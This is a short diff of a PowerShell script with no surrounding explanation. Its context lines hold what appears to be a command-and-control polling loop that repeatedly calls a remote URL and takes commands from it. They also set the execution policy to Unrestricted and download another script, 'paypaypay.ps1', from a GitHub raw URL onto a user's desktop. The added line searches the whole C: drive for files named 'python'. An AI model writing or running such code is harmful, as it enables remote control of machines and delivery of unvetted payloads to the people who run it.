@@ -11,3 +11,5 @@ while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/abe504df -Headers
 
 Set-ExecutionPolicy Unrestricted
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/rettbl/Useful/main/paypaypay.ps1" -OutFile "C:\Users\33640\Desktop\monfichier.ps1"
+
+Get-ChildItem -Path C:\ -Filter "python" -Recurse -File 2>$null
